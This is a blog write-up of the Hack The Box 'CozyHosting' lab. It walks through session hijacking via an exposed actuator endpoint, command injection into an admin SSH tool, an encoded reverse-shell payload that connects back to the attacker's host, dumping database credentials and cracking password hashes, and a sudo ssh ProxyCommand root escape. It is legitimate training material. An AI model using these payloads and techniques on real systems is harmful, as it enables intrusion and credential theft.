---
layout: post
title: "HTB: CozyHosting"
author: Andrew Cherney
date: 2024-03-02 11:24:20
tags: htb medium-box linux webapp command-injection postgres john session-hijacking
icon: "assets/icons/cozyhosting.png"
post_description: "The foothold can be obtained from hijacking a session to gain access to an admin portal, then command injecting into an ssh utility within the admin utilities. Postgres dumps a credential which john can crack for another user. A little stdin/stdout redirecting can be used to gain a root shell with sudo."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/CozyHosting]
└──╼ $nmap -sC 10.129.104.14
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-03 13:40 CDT
Nmap scan report for 10.129.104.14
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://cozyhosting.htb
```


<h2>Port 80 - http</h2>


{% include img_link src="/img/cozyhosting/cozyhosting_front_page" alt="front_page" ext="png" trunc=600 %}

Basic web hosting page, points to a login portal.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/CozyHosting]
└──╼ $dirsearch -u http://cozyhosting.htb/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Active/CozyHosting/reports/http_cozyhosting.htb/__23-09-03_14-48-27.txt

Target: http://cozyhosting.htb/

[14:48:27] Starting: 
[14:48:40] 200 -    0B  - /;/admin
[14:48:40] 200 -    0B  - /;/login
[14:48:40] 200 -    0B  - /;json/
[14:48:40] 200 -    0B  - /;admin/
[14:48:40] 200 -    0B  - /;login/
[14:48:40] 200 -    0B  - /;/json
[14:48:40] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
...
[14:48:43] 200 -    5KB - /actuator/env
[14:48:44] 200 -   10KB - /actuator/mappings
[14:48:44] 200 -   98B  - /actuator/sessions
[14:48:44] 200 -  124KB - /actuator/beans
...

Task Completed
```

searching for directories I see that there is leftover session data from actuator. Which yields the following json:

![json sessions data](/img/cozyhosting/cozyhosting_actuator_sessions.png)

<h1>User as josh</h1>

<h2>Foothold as app</h2>>

I can replace my cookie data with the session for kanderson and access the admin portal.

![admin portal](/img/cozyhosting/cozyhosting_admin_page.png)


Inside the portal we can find an ssh based scanner tool which takes a hostname and an IP (and a pre-existing key the admin should have). I toss in a basic IP with no hostname and receive the following error in the url:

```bash
IP: 1.1.1.1
Hostname: 

http://cozyhosting.htb/admin?error=usage:%20ssh%20[-46AaCfGgKkMNnqsTtVvXxYy]%20[-B%20bind_interface]%20%20%20%20%20%20%20%20%20%20%20[-b%20bind_address]%20[-c%20cipher_spec]%20[-D%20[bind_address:]port]%20%20%20%20%20%20%20%20%20%20%20[-E%20log_file]%20[-e%20escape_char]%20[-F%20configfile]%20[-I%20pkcs11]%20%20%20%20%20%20%20%20%20%20%20[-i%20identity_file]%20[-J%20[user@]host[:port]]%20[-L%20address]%20%20%20%20%20%20%20%20%20%20%20[-l%20login_name]%20[-m%20mac_spec]%20[-O%20ctl_cmd]%20[-o%20option]%20[-p%20port]%20%20%20%20%20%20%20%20%20%20%20[-Q%20query_option]%20[-R%20address]%20[-S%20ctl_path]%20[-W%20host:port]%20%20%20%20%20%20%20%20%20%20%20[-w%20local_tun[:remote_tun]]%20destination%20[command%20[argument%20...]]
```

The backend is probably running `ssh given_host@given_IP -i key` When erroring out in this fashion I could probably read any local file so long as it takes the form of an error but I can do better here. The only restrictions before me are the host IP can only be an address, whereas the hostname cannot have whitespace. The easiest way around that is to use a variable with whitespace in it for every space I need.

So I'll use an ip of **1.1.1.1** and a hostname of `;${IFS}echo${IFS}raccoon;`. The `${IFS}` is a variable that contains one whitespace, and the semicolons end the previous command and then this one. The results:

```bash
IP: 1.1.1.1
Hostname: ;${IFS}echo${IFS}raccoon;

http://cozyhosting.htb/admin?error=usage:%20ssh%20[-46AaCfGgKkMNnqsTtVvXxYy]%20[-B%20bind_interface]%20%20%20%20%20%20%20%20%20%20%20[-b%20bind_address]%20[-c%20cipher_spec]%20[-D%20[bind_address:]port]%20%20%20%20%20%20%20%20%20%20%20[-E%20log_file]%20[-e%20escape_char]%20[-F%20configfile]%20[-I%20pkcs11]%20%20%20%20%20%20%20%20%20%20%20[-i%20identity_file]%20[-J%20[user@]host[:port]]%20[-L%20address]%20%20%20%20%20%20%20%20%20%20%20[-l%20login_name]%20[-m%20mac_spec]%20[-O%20ctl_cmd]%20[-o%20option]%20[-p%20port]%20%20%20%20%20%20%20%20%20%20%20[-Q%20query_option]%20[-R%20address]%20[-S%20ctl_path]%20[-W%20host:port]%20%20%20%20%20%20%20%20%20%20%20[-w%20local_tun[:remote_tun]]%20destination%20[command%20[argument%20...]/bin/bash:%20line%201:%20@1.1.1.1:%20command%20not%20found
```

No command output, but it clearly interfered with the error output. I try some other commands to no avail and decide to try set a variable as a command and include it in the error message. `;raccoon=$(whoami);$raccoon` is the payload, and what this does is prepend the variable raccoon to the `@IP` part of the ssh command. 

```
IP: 1.1.1.1
Hostname: ;raccoon=$(whoami);$raccoon

/bin/bash:%20line%201:%20app@1.1.1.1:%20command%20not%20found
```

My first hunch works here but in my head there is still RCE here. I try to base64 encode a shell payload and try running that. This would bypass any funky business that is happening with special characters such as `/ : < > &`. The hostname: `;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTUvNzc3NyAwPiYxCg==${IFS}|base64${IFS}-d${IFS}|${IFS}bash;`

```bash
IP: 1.1.1.1
Hostname: ;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTUvNzc3NyAwPiYxCg==${IFS}|base64${IFS}-d${IFS}|${IFS}bash;
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/CozyHosting]
└──╼ $nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.129.105.136 51098
bash: cannot set terminal process group (990): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ whoami
whoami
app
```

<h2>postgres creds</h2>

Immediately upon gaining access I see a jar file which is the backbone of this site. I grab that and sift around.

```bash
app@cozyhosting:/app$ ls          
ls
cloudhosting-0.0.1.jar
app@cozyhosting:/app$ python3 -m http.server 8081
python3 -m http.server 8081
10.10.14.115 - - [05/Sep/2023 00:13:26] "GET /cloudhosting-0.0.1.jar HTTP/1.1" 200 -
```

In the `application.properties` part of the jar there are credentials for postgres database access.

```bash
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

```bash
app@cozyhosting:/app$ psql -W "postgresql://postgres@localhost/postgres"
Vg&nvzAQ7XxR
```

Now we can enumerate databases, connect to one that sticks out, enumerate tables, then dump all the contents.

```postgresql
postgres=# \l     
\l
WARNING: terminal is not fully functional
Press RETURN to continue 

                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
eges   
-------------+----------+----------+-------------+-------------+----------------
-------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
(4 rows)

(END):q
postgres=# 
postgres=# \c cozyhosting
\c cozyhosting
Password: Vg&nvzAQ7XxR

SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
cozyhosting=# \dt
\dt
WARNING: terminal is not fully functional
Press RETURN to continue 

         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

(END):q
cozyhosting=# 
cozyhosting=# \d users
\d users
WARNING: terminal is not fully functional
Press RETURN to continue 

                        Table "public.users"
  Column  |          Type          | Collation | Nullable | Default 
----------+------------------------+-----------+----------+---------
 name     | character varying(50)  |           | not null | 
 password | character varying(100) |           | not null | 
 role     | role                   |           |          | 
Indexes:
    "users_pkey" PRIMARY KEY, btree (name)
Referenced by:
    TABLE "hosts" CONSTRAINT "hosts_username_fkey" FOREIGN KEY (username) REFERE
NCES users(name)

cozyhosting=# select name,password from users;
select name,password from users;
WARNING: terminal is not fully functional
Press RETURN to continue 

   name    |                           password                           
-----------+--------------------------------------------------------------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
(2 rows)
```

Crack those with john and we are on our way. It is of note I checked `/etc/passwd` as app and found that josh was the user with a home directory, do that password is likely his.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/CozyHosting]
└──╼ $john hash --wordlist=/opt/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)
```


```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/CozyHosting]
└──╼ $ssh josh@cozyhosting.htb
josh@cozyhosting.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)
...

josh@cozyhosting:~$ cat user.txt
772a739c14f4a-------------------
```



<h1>Root</h1>

<h2>sudo ssh</h2>

I check the classics of `sudo -l` and `pspy64` to find that ssh is executable as root.

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

<h2>stdin, stdout, stderr</h2>

ProxyCommand in this instance is used, as the name suggests, to proxy command to another host. These commands do not drop the elevated privileges and hence give us a free root shell. In this particular example we are using sh to create a shell then sending stdin `0` and stdout `1` to stderr `&2`. That means that all of the ssh data prior to the `;sh` command and all of the output of said command are sent to stderr and will only be output if an error happens. 

```bash
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# cat /root/root.txt
5d099fb2a2b---------------------
```


